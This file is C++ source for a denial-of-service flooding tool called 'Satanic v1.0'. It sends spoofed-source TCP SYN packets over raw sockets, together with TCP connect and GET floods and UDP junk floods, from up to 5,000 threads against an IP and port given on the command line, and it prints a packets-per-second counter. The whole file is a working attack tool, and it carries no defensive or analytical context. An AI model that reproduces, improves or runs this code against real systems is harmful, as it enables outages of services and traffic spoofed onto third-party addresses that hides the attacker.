#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <cstring>
#include <random>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>

using namespace std;

class Satanic {
private:
    string target_ip;
    int target_port;
    int thread_count;
    atomic<bool> running;
    atomic<long long> total_packets;
    atomic<long long> total_connections;
    struct sockaddr_in dest_addr;
    random_device rd;
    mt19937 gen;
    vector<thread> workers;

    unsigned short checksum(unsigned short *ptr, int nbytes) {
        long sum = 0;
        while (nbytes > 1) {
            sum += *ptr++;
            nbytes -= 2;
        }
        if (nbytes == 1) {
            sum += *(unsigned char*)ptr;
        }
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return (unsigned short)~sum;
    }

    void build_tcp_packet(char* packet, uint32_t src_ip, uint32_t dest_ip, uint16_t src_port) {
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0x4000;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = src_ip;
        ip->daddr = dest_ip;
        
        tcp->source = htons(src_port);
        tcp->dest = htons(target_port);
        tcp->seq = htonl(rand() % 1000000000);
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->urg_ptr = 0;
        
        ip->check = checksum((unsigned short*)ip, sizeof(struct iphdr));
        
        struct pseudo_header {
            uint32_t src_addr;
            uint32_t dst_addr;
            uint8_t placeholder;
            uint8_t protocol;
            uint16_t tcp_length;
        } pseudo;
        
        pseudo.src_addr = src_ip;
        pseudo.dst_addr = dest_ip;
        pseudo.placeholder = 0;
        pseudo.protocol = IPPROTO_TCP;
        pseudo.tcp_length = htons(sizeof(struct tcphdr));
        
        char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &pseudo, sizeof(struct pseudo_header));
        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
        tcp->check = checksum((unsigned short*)pseudo_packet, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
    }

    uint32_t random_ip() {
        uint32_t ip = (rand() % 254 + 1) << 24;
        ip |= (rand() % 254 + 1) << 16;
        ip |= (rand() % 254 + 1) << 8;
        ip |= (rand() % 254 + 1);
        return htonl(ip);
    }

    void worker_thread(int thread_id) {
        int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        int tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
        int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
        
        if (raw_sock < 0) {
            raw_sock = socket(AF_INET, SOCK_STREAM, 0);
        }
        
        int one = 1;
        setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(target_port);
        sin.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        uint16_t port_base = 1024 + thread_id * 100;
        char packet[1024];
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 10;
        setsockopt(tcp_sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(udp_sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        int flags = fcntl(tcp_sock, F_GETFL, 0);
        fcntl(tcp_sock, F_SETFL, flags | O_NONBLOCK);
        
        while (running) {
            try {
                memset(packet, 0, sizeof(packet));
                uint32_t src_ip = random_ip();
                uint16_t src_port = port_base + (rand() % 1000);
                build_tcp_packet(packet, src_ip, dest_addr.sin_addr.s_addr, src_port);
                
                if (raw_sock > 0) {
                    sendto(raw_sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, 
                          (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                }
                
                if (tcp_sock > 0) {
                    connect(tcp_sock, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                    send(tcp_sock, "GET / HTTP/1.1\r\n\r\n", 18, MSG_DONTWAIT);
                }
                
                if (udp_sock > 0) {
                    string payload = "A";
                    payload.append(rand() % 1000, 'A');
                    sendto(udp_sock, payload.c_str(), payload.length(), 0, 
                          (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                }
                
                total_packets++;
                total_connections++;
                
                if (rand() % 100 < 3) {
                    this_thread::sleep_for(chrono::microseconds(rand() % 1000));
                }
                
            } catch (...) {
                this_thread::sleep_for(chrono::milliseconds(1));
            }
        }
        
        close(raw_sock);
        close(tcp_sock);
        close(udp_sock);
    }

public:
    Satanic(string ip, int port, int threads = 1000) 
        : target_ip(ip), target_port(port), thread_count(threads), 
          running(true), total_packets(0), total_connections(0), gen(rd()) {
        
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &dest_addr.sin_addr);
        
        cout << "[+] Target: " << ip << ":" << port << "\n";
        cout << "[+] Threads: " << threads << "\n";
    }

    void start() {
        cout << "[+] Starting attack...\n";
        for (int i = 0; i < thread_count; i++) {
            workers.emplace_back(&Satanic::worker_thread, this, i);
            this_thread::sleep_for(chrono::microseconds(50));
        }
        
        auto start_time = chrono::steady_clock::now();
        
        while (running) {
            this_thread::sleep_for(chrono::seconds(2));
            auto now = chrono::steady_clock::now();
            auto elapsed = chrono::duration_cast<chrono::seconds>(now - start_time).count();
            if (elapsed > 0) {
                cout << "\r[+] Packets: " << total_packets 
                     << " | Conn: " << total_connections
                     << " | PPS: " << (total_packets / elapsed)
                     << "   " << flush;
            }
        }
        
        for (auto& t : workers) {
            if (t.joinable()) {
                t.join();
            }
        }
    }

    void stop() {
        running = false;
    }
};

int main(int argc, char* argv[]) {
    cout << "Satanic v1.0\n";
    
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <ip> <port> [threads]\n";
        cout << "Example: " << argv[0] << " 192.168.1.1 80 500\n";
        return 1;
    }
    
    string ip = argv[1];
    int port = atoi(argv[2]);
    int threads = (argc > 3) ? atoi(argv[3]) : 1000;
    
    if (threads > 5000) {
        threads = 5000;
    }
    
    signal(SIGINT, [](int){ cout << "\n[+] Interrupted\n"; exit(0); });
    
    Satanic satanic(ip, port, threads);
    satanic.start();
    
    return 0;
}